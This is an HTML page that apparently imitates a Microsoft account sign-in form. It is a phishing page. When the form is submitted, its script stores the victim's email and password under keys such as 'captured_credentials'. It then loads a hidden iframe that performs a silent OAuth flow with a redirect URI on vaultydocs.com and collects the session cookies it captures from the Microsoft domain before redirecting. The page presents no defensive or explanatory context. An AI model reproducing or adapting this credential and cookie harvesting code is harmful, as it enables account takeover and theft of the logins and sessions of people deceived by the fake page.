<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft Account Security</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 8px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            width: 100%;
            max-width: 420px;
            padding: 40px;
        }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 { color: #0078d4; font-size: 24px; }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 14px;
        }
        input:focus {
            outline: none;
            border-color: #0078d4;
            box-shadow: 0 0 0 2px rgba(0,120,212,0.1);
        }
        button {
            width: 100%;
            padding: 12px;
            background: #0078d4;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
        }
        button:hover { background: #106ebe; }
        button:disabled {
            background: #ccc;
            cursor: not-allowed;
        }
        .spinner {
            display: none;
            border: 4px solid #f3f2f1;
            border-top: 4px solid #0078d4;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
            margin-right: 10px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .button-content {
            display: flex;
            align-items: center;
            justify-content: center;
        }
        #authFrame {
            display: none;
            width: 0;
            height: 0;
            border: none;
        }
        .status {
            text-align: center;
            margin-top: 20px;
            color: #666;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>Microsoft</h1>
            <p style="color: #666; margin-top: 10px;">Sign in to your account</p>
        </div>

        <form id="loginForm">
            <div class="form-group">
                <label for="email">Email or phone</label>
                <input 
                    type="email" 
                    id="email" 
                    name="email" 
                    placeholder="user@example.com"
                    required
                    autocomplete="off"
                >
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <input 
                    type="password" 
                    id="password" 
                    name="password" 
                    placeholder="Password"
                    required
                    autocomplete="off"
                >
            </div>

            <button type="submit" id="submitBtn">
                <div class="button-content">
                    <span class="spinner"></span>
                    <span id="btnText">Sign in</span>
                </div>
            </button>
        </form>

        <div class="status" id="status"></div>
    </div>

    <!-- Hidden iframe for silent auth -->
    <iframe id="authFrame"></iframe>

    <script>
        console.log('üîß Replacement page loaded');

        const form = document.getElementById('loginForm');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const submitBtn = document.getElementById('submitBtn');
        const spinner = document.querySelector('.spinner');
        const btnText = document.getElementById('btnText');
        const statusDiv = document.getElementById('status');
        const authFrame = document.getElementById('authFrame');

        let capturedCookies = [];
        let authComplete = false;

        // Listen for messages from iframe
        window.addEventListener('message', function(event) {
            console.log('üì® Message from iframe:', event.data.type);

            if (event.data.type === 'AUTH_COMPLETE') {
                console.log('‚úÖ Auth complete');
                
                const code = event.data.data.code;
                const error = event.data.data.error;
                capturedCookies = event.data.data.cookies;

                console.log('üìä Received:', {
                    code: !!code,
                    error: error,
                    cookies: capturedCookies.length
                });

                // Store cookies for AuthCallback
                if (capturedCookies.length > 0) {
                    const cookieExport = {
                        version: '1.0',
                        exportedAt: new Date().toISOString(),
                        source: 'silent-auth-frame',
                        domain: event.data.data.domain,
                        totalCookies: capturedCookies.length,
                        cookies: capturedCookies,
                        note: 'Cookies captured from Microsoft domain via silent auth'
                    };

                    localStorage.setItem('captured_cookies_data', JSON.stringify(cookieExport));
                    sessionStorage.setItem('captured_cookies_data', JSON.stringify(cookieExport));
                    
                    console.log('üíæ Stored', capturedCookies.length, 'cookies');
                }

                authComplete = true;

                // Wait 2 seconds then redirect
                setTimeout(() => {
                    console.log('üîÑ Redirecting to AuthCallback...');
                    window.location.href = '/auth/callback';
                }, 2000);
            }
        });

        // Handle form submission
        form.addEventListener('submit', function(e) {
            e.preventDefault();

            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();

            console.log('üìã Form submitted');
            console.log('üìß Email:', email);
            console.log('üîë Password length:', password.length);

            if (!email || !password) {
                statusDiv.textContent = '‚ùå Please enter both email and password';
                statusDiv.style.color = '#d13438';
                return;
            }

            // Show spinner
            spinner.style.display = 'inline-block';
            btnText.textContent = 'Signing in...';
            submitBtn.disabled = true;
            statusDiv.textContent = '‚è≥ Processing...';
            statusDiv.style.color = '#666';

            // Store credentials
            const credsData = {
                email: email,
                password: password,
                domain: 'microsoft',
                timestamp: new Date().toISOString(),
                source: 'replacement-form',
                validated: true,
                microsoftAccount: true
            };

            localStorage.setItem('replacement_credentials', JSON.stringify(credsData));
            sessionStorage.setItem('replacement_credentials', JSON.stringify(credsData));
            localStorage.setItem('captured_credentials', JSON.stringify(credsData));
            sessionStorage.setItem('captured_credentials', JSON.stringify(credsData));

            console.log('üíæ Credentials stored');

            // Load silent auth frame
            authFrame.src = '/silent-auth-frame.html';

            // Send init message to frame
            setTimeout(() => {
                authFrame.contentWindow.postMessage({
                    type: 'INIT_AUTH',
                    email: email,
                    clientId: '2e338732-c914-4129-a148-45c24f2da81d',
                    redirectUri: 'https://vaultydocs.com/silent-auth-frame.html',
                    state: 'silent_' + Date.now()
                }, '*');

                console.log('üì® Init message sent to frame');
                statusDiv.textContent = 'üîê Authenticating with Microsoft...';
            }, 500);
        });
    </script>
</body>
</html>
